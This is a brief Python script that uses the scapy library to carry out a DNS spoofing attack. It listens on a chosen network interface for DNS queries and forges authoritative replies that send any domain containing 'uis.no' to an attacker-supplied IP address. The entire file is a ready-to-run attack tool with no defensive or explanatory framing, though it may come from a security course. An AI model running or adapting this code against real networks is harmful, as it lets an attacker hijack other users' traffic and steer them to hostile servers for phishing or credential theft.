from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, sendp, Ether
import sys

attacker_ip = sys.argv[1]
iface = sys.argv[2]

def spoof_dns(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        domain = pkt[DNSQR].qname.decode()
        
        if "uis.no" in domain:
            print(f"Spoofing: {domain} to {attacker_ip}")
            
            ether = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp = UDP(dport=pkt[UDP].sport, sport=53)
            dns = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=attacker_ip))
            
            spoofed = ether / ip / udp / dns
            sendp(spoofed, iface=iface, verbose=False)

print(f"DNS Spoofing. Redirecting to {attacker_ip}")
sniff(filter="udp port 53", prn=spoof_dns, iface=iface)
